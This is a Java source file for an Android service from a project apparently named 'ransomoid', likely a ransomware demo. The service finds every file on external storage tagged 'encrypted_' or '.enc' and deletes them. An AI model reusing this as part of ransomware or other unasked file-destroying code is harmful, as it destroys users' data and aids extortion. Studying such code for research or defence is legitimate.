package falezza.fabio.ransomoid.services;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.support.annotation.Nullable;

import java.io.File;
import java.util.ArrayList;

import falezza.fabio.ransomoid.activities.FinishedActivity;
import falezza.fabio.ransomoid.utils.FileProcessor;

public class CleanService extends IntentService {

    private ArrayList<File> files;

    public CleanService() {
        super("cleanService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        this.getFiles();
        this.clean();
    }

    private void getFiles() {
        this.files = FileProcessor.getInstance().getFiles(Environment.getExternalStorageDirectory(),
                new String[] {"encrypted_", ".enc"},
                new String[] {"Android/data"});
    }

    private void clean() {
        for (File file : this.files) {
            file.delete();
        }
    }

}
